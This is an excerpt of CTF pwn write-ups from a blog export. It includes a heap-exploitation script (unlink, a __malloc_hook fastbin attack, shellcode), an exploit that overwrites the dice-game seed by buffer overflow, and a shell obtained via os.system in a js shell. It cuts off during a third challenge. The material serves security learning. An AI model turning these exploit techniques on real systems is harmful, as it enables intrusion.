p64(<span class="number">0x110</span>) </span><br><span class="line">    update(<span class="number">0</span>,<span class="built_in">len</span>(payload1),payload1)</span><br><span class="line">    delete(<span class="number">1</span>) <span class="comment"># unlink, now buf[0] -&gt; buf_addr - 0x18</span></span><br><span class="line"></span><br><span class="line">    payload2 = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(bss_addr)</span><br><span class="line">    update(<span class="number">0</span>,<span class="built_in">len</span>(payload2),payload2) <span class="comment"># set buf[0] -&gt; bss</span></span><br><span class="line">    update(<span class="number">0</span>,<span class="built_in">len</span>(shellcode),shellcode) <span class="comment"># write shellcode to bss</span></span><br><span class="line"></span><br><span class="line">    create(<span class="number">0x10</span>,<span class="string">&#x27;2&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># chunk 2</span></span><br><span class="line">    create(<span class="number">0x80</span>,<span class="string">&#x27;3&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># chunk 3</span></span><br><span class="line">    create(<span class="number">0x60</span>,<span class="string">&#x27;4&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># chunk 4</span></span><br><span class="line">    create(<span class="number">0x60</span>,<span class="string">&#x27;5&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># chunk 5</span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">3</span>) <span class="comment"># to unsorted bin, leave &#x27;main_arena + 0x88&#x27; in fd</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># this part is for debug</span></span><br><span class="line">    <span class="comment"># delete(4)</span></span><br><span class="line">    <span class="comment"># print pidof(sh)</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">    create(<span class="number">0x80</span>,p16(exploit_addr)) <span class="comment"># chunk 6 (3) # partial write &#x27;fd&#x27; to be &#x27;malloc_hook - 0x23&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload3 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)</span><br><span class="line">    update(<span class="number">2</span>,<span class="built_in">len</span>(payload3),payload3)</span><br><span class="line">    delete(<span class="number">4</span>)</span><br><span class="line">    delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># this part is also for debug</span></span><br><span class="line">    <span class="comment"># print pidof(sh)</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    update(<span class="number">5</span>,<span class="number">1</span>,p8(<span class="number">0x30</span>)) <span class="comment"># partial write &#x27;fd&#x27; of chunk 5 to point to chunk 3</span></span><br><span class="line"></span><br><span class="line">    create(<span class="number">0x60</span>,<span class="string">&#x27;7&#x27;</span>*<span class="number">8</span>) <span class="comment"># chunk 7 (5)</span></span><br><span class="line">    create(<span class="number">0x60</span>,<span class="string">&#x27;8&#x27;</span>*<span class="number">8</span>) <span class="comment"># chunk 8 (3)</span></span><br><span class="line">    <span class="comment"># create(0x65,&#x27;xxx&#x27;) # &#x27;size&#x27; must be 0x58-0x68, corresponding to 0x7f</span></span><br><span class="line">    create(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x13</span>+p64(bss_addr)) <span class="comment"># chunk 8 (__malloc_hook - 0x23)</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)  </span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)  </span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># crack()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># brute force</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    sh = process(<span class="string">&#x27;timu&#x27;</span>)</span><br><span class="line">    <span class="comment"># sh = remote(&#x27;220.249.52.133&#x27;,&#x27;56588&#x27;)</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Round:&#x27;</span>+<span class="built_in">str</span>(i)</span><br><span class="line">        crack()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        sh.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>linux</tag>
        <tag>stack-overflow</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
        <tag>unlink</tag>
      </tags>
  </entry>
  <entry>
    <title>ADWorld PWN Challenge Area Write-ups (Misc)</title>
    <url>/2020/10/05/2020-10-05-ADWorld-PWN-Challenge-Area-Write-ups-Misc/</url>
    <content><![CDATA[<h2 id="dice-game"><a href="#dice-game" class="headerlink" title="dice game"></a>dice game</h2><p>Attachment: <a href="/filehost/apcaw/dice_game.zip">dice_game.zip</a><br>Description: None. </p>
<p>The <code>dice game</code> is similar but harder than <code>guess num</code> which in <a class="link"   href="http://localhost:4000/2020/07/24/2020-07-24-ADWorld-PWN-Exercise-Area-Write-ups/#guess-num" >ADworld PWN exercise area<i class="fas fa-external-link-alt"></i></a>. Just find out the flag.</p>
<h3 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h3><p>Check:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ file dice_game</span><br><span class="line">dice_game: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=25432b87a385dc5acec03263b2e3746f287ed159, stripped</span><br><span class="line">$ checksec dice_game</span><br><span class="line">[*] &#x27;/root/dice_game&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">$ ./libc.so.6</span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.23-0ubuntu10) stable release version 2.23, by Roland McGrath et al.</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.</span><br><span class="line">There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 5.4.0 20160609.</span><br><span class="line">Available extensions:</span><br><span class="line">        crypt add-on version 2.1 by Michael Glad and others</span><br><span class="line">        GNU Libidn by Simon Josefsson</span><br><span class="line">        Native POSIX Threads Library by Ulrich Drepper et al</span><br><span class="line">        BIND-8.2.3-T5B</span><br><span class="line">libc ABIs: UNIQUE IFUNC</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span><br></pre></td></tr></table></figure>
<p>Pseudocode:<br><code>main</code>: </p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">55</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+37h] [rbp-19h]</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [rsp+4Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  *(_QWORD *)seed = <span class="built_in">time</span>(<span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome, let me know your name: &quot;</span>, a2);</span><br><span class="line">  <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  v6 = <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( v6 &lt;= <span class="number">49</span> )</span><br><span class="line">    buf[v6 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hi, %s. Let&#x27;s play a game.\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  <span class="built_in">srand</span>(seed[<span class="number">0</span>]);</span><br><span class="line">  v8 = <span class="number">1</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Game %d/50\n&quot;</span>, v8);</span><br><span class="line">    v5 = <span class="built_in">sub_A20</span>();</span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line">    <span class="keyword">if</span> ( v5 != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v8 == <span class="number">50</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">sub_B28</span>((__int64)buf);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Bye bye!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sub_A20</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">sub_A20</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int16 v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line">  __int16 v2; <span class="comment">// [rsp+Eh] [rbp-2h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give me the point(1~6): &quot;</span>);</span><br><span class="line">  <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%hd&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="built_in">rand</span>() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt;= <span class="number">0</span> || v1 &gt; <span class="number">6</span> || v2 &lt;= <span class="number">0</span> || v2 &gt; <span class="number">6</span> )</span><br><span class="line">      _assert_fail(<span class="string">&quot;(point&gt;=1 &amp;&amp; point&lt;=6) &amp;&amp; (sPoint&gt;=1 &amp;&amp; sPoint&lt;=6)&quot;</span>, <span class="string">&quot;dice_game.c&quot;</span>, <span class="number">0x18</span>u, <span class="string">&quot;dice_game&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v1 == v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You win.&quot;</span>);</span><br><span class="line">      result = <span class="number">1LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You lost.&quot;</span>);</span><br><span class="line">      result = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid value!&quot;</span>);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sub_B28</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_B28</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Congrats %s\n&quot;</span>, a1);</span><br><span class="line">  stream = <span class="built_in">fopen</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="built_in">fgets</span>(&amp;s, <span class="number">100</span>, stream);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">fflush</span>(stdout);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>It is similar to <code>guess num</code> because they both need to overflow to set specific seed. </p>
<p>After extracting <code>dice _game.zip</code>, it gives a <code>libc.so.6</code> for us. The results of <code>rand()</code> is decided by this <code>lib</code> file in the target pc.</p>
<p>So we have 2 ways to deal with it:</p>
<ol>
<li>write our own <code>rand</code> test program to see the result, remember to compile with given <code>libc.so.6</code>.</li>
<li>call <code>libc.so.6</code> in python, using <code>ctypes</code> lib.</li>
</ol>
<p>As for the offset, we input <code>buf</code> to overflow <code>seed</code>, so it should be <code>0x50 - 0x10 == 0x40</code>.</p>
<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>Like what we do with <code>guess num</code>, we write <code>rand.c</code> to test the result (I want to overflow <code>seed</code> as <code>00000000</code>, so…):</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  gcc rand.c -Wl,--rpath=/root/lib -Wl,--dynamic-linker=/root/lib/libc.so.6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">p</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">rand</span>() % <span class="number">6</span> + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="number">0x3030303030303030</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">50</span>;i++)&#123;</span><br><span class="line">    <span class="built_in">p</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Remember to compile with the given <code>libc</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ gcc rand.c -Wl,--rpath=/root/lib -Wl,--dynamic-linker=/root/lib/libc.so.6</span><br><span class="line">$ ./a.out</span><br><span class="line">6</span><br><span class="line">5</span><br><span class="line">1</span><br><span class="line">...</span><br><span class="line">6</span><br><span class="line">1</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<p>Then we run <code>dice_game</code> (copy and paste):</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ./dice_game</span><br><span class="line">Welcome, let me know your name: 000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">Hi, 00000000000000000000000000000000000000000000000000000000I. Lets play a game.</span><br><span class="line">Game 1/50</span><br><span class="line">Give me the point(1~6): 6</span><br><span class="line">...</span><br><span class="line">Give me the point(1~6): 1</span><br><span class="line">1You win.</span><br><span class="line">Game 50/50</span><br><span class="line">Give me the point(1~6): You win.</span><br><span class="line">Congrats 0000000000000000000000000000000000000000000000000000000I</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>

<p>Or use <code>cdll</code> of <code>ctypes</code> to load <code>libc</code> and run <code>C</code> language functions in python:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./dice_game&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">39266</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br><span class="line">payload = <span class="string">&#x27;0&#x27;</span> * <span class="number">0x40</span> + p64(<span class="number">0x3030303030303030</span>)</span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line">libc.srand(<span class="number">0x3030303030303030</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    num = libc.rand() % <span class="number">6</span> + <span class="number">1</span></span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(num))</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="monkey"><a href="#monkey" class="headerlink" title="monkey"></a>monkey</h2><p>Attachment: <a href="/filehost/apcaw/monkey.zip">monkey.zip</a><br>Description: None</p>
<p>It’s about JavaScript Shell.</p>
<h3 id="Information-1"><a href="#Information-1" class="headerlink" title="Information"></a>Information</h3><p>Check:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ unzip monkey.zip</span><br><span class="line">Archive:  monkey.zip</span><br><span class="line">  inflating: js</span><br><span class="line">  inflating: libnspr4.so</span><br><span class="line">  inflating: libplds4.so</span><br><span class="line">  inflating: libplc4.so</span><br><span class="line">$ file js</span><br><span class="line">js: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.18, BuildID[sha1]=e3c6583926710fbbace7f075fd88ea7963faa0e0, not stripped</span><br><span class="line">$ checksec  js</span><br><span class="line">[*] &#x27;/root/js&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>Pseudocode is a mess.</p>
<h3 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h3><p>We are familiar with JavaScript, but what is js shell? It is a command line program included in SpiderMonkey source code, and it acts like Python interpreter.</p>
<p>Use <code>help()</code> to see help page, and use <code>dumpHeap()</code> to dump the heap. Among <code>help()</code> result we can see:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">os - interface object</span><br><span class="line">  os.getenv os.getpid os.system os.spawn os.kill os.waitpid os.file os.path</span><br></pre></td></tr></table></figure>
<p>There we can use <code>os.system</code> to get shell.</p>
<h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><p>Using <code>nc</code> to interact is ok:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nc 220.249.52.133 56711</span><br><span class="line">js&gt; os.system(&#x27;sh&#x27;)</span><br><span class="line">os.system(&#x27;sh&#x27;)</span><br><span class="line">ls</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">js</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">libnspr4.so</span><br><span class="line">libplc4.so</span><br><span class="line">libplds4.so</span><br><span class="line">run.sh</span><br><span class="line">cat flag</span><br><span class="line">cyberpeace&#123;xxxxxxxxxxxxxxxxxxxx&#125;</span><br></pre></td></tr></table></figure>
<p>Or use <code>read</code> to read file (know it from other writeup):</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">js&gt; read(&#x27;flag&#x27;)</span><br><span class="line">read(&#x27;flag&#x27;)</span><br><span class="line">js&gt; print()</span><br><span class="line">print()</span><br><span class="line">&quot;cyberpeace&#123;xxxxxxxxxxxxxxxxxxxx&#125;\n&quot;</span><br></pre></td></tr></table></figure>

<h2 id="secret-file"><a href="#secret-file" class="headerlink" title="secret_file"></a>secret_file</h2><p>Attachment: <a href="/filehost/apcaw/secret_file">secret_file</a><br>Description: Confidential.</p>
<p>It’s about hash (sha-256).</p>
<h3 id="Information-2"><a href="#Information-2" class="headerlink" title="Information"></a>Information</h3><p>Check:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ file secret_file</span><br><span class="line">secret_file: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=700ac7785d436db2bbb5642f99678fe1ef0394b8, stripped</span><br><span class="line">$ checksec secret_file</span><br><span class="line">[*] &#x27;/root/secret_file&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>Pseudocode:<br><code>main</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v4; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">int</span> *v5; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// er12</span></span><br><span class="line">  FILE *v9; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+0h] [rbp-308h]</span></span><br><span class="line">  <span class="keyword">char</span> *lineptr; <span class="comment">// [rsp+8h] [rbp-300h]</span></span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [rsp+10h] [rbp-2F8h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+110h] [rbp-1F8h]</span></span><br><span class="line">  _BYTE v15[<span class="number">5</span>]; <span class="comment">// [rsp+12Bh] [rbp-1DDh]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+16Ch] [rbp-19Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [rsp+18Ch] [rbp-17Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [rsp+1CCh] [rbp-13Ch]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+1D0h] [rbp-138h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v20; <span class="comment">// [rsp+2D8h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v20 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">PREPARE</span>(&amp;dest);</span><br><span class="line">  v11 = <span class="number">0LL</span>;</span><br><span class="line">  lineptr = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">getline</span>(&amp;lineptr, (<span class="keyword">size_t</span> *)&amp;v11, stdin) == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  v3 = <span class="built_in">strrchr</span>(lineptr, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  *v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = (<span class="keyword">unsigned</span> __int8 *)&amp;v16;</span><br><span class="line">  v5 = &amp;v17;</span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;dest, lineptr);</span><br><span class="line">  <span class="built_in">SHA256</span>((__int64)&amp;dest, &amp;v16, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = *v4;</span><br><span class="line">    v7 = (<span class="keyword">char</span> *)v5;</span><br><span class="line">    v5 = (<span class="keyword">int</span> *)((<span class="keyword">char</span> *)v5 + <span class="number">2</span>);</span><br><span class="line">    ++v4;</span><br><span class="line">    <span class="built_in">snprintf</span>(v7, <span class="number">3uLL</span>, <span class="string">&quot;%02x&quot;</span>, v6);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v5 != &amp;v18 );</span><br><span class="line">  v8 = <span class="built_in">strcmp</span>(v15, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v17);</span><br><span class="line">  <span class="keyword">if</span> ( v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;wrong password!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = <span class="built_in">popen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v14, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v9 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="built_in">fgets</span>(&amp;s, <span class="number">256</span>, v9) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, &amp;s);</span><br><span class="line">  <span class="built_in">fclose</span>(v9);</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>PREPARE</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">sub_E60</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v_14[<span class="number">26</span>]; <span class="comment">// [rsp+0h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [rsp+1Ah] [rbp-5Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">64</span>]; <span class="comment">// [rsp+20h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+68h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(a1, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">qmemcpy</span>(v_14, <span class="string">&quot;/bin/cat ./secret_data.asc&quot;</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(v_14));</span><br><span class="line">  <span class="built_in">snprintf</span>(</span><br><span class="line">    a1 + <span class="number">256</span>,</span><br><span class="line">    <span class="number">0x1B</span>uLL,</span><br><span class="line">    <span class="string">&quot;%s&quot;</span>,</span><br><span class="line">    v_14,</span><br><span class="line">    *(_QWORD *)v_14,</span><br><span class="line">    *(_QWORD *)&amp;v_14[<span class="number">8</span>],</span><br><span class="line">    *(_QWORD *)&amp;v_14[<span class="number">16</span>],</span><br><span class="line">    *(_QWORD *)&amp;v_14[<span class="number">24</span>]);</span><br><span class="line">  <span class="built_in">strcpy</span>(v4, <span class="string">&quot;9387a00e31e413c55af9c08c69cd119ab4685ef3bc8bcbe1cf82161119457127&quot;</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(a1 + <span class="number">283</span>, <span class="number">0x41</span>uLL, <span class="string">&quot;%s&quot;</span>, v4);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>SHA256</code>:</p>
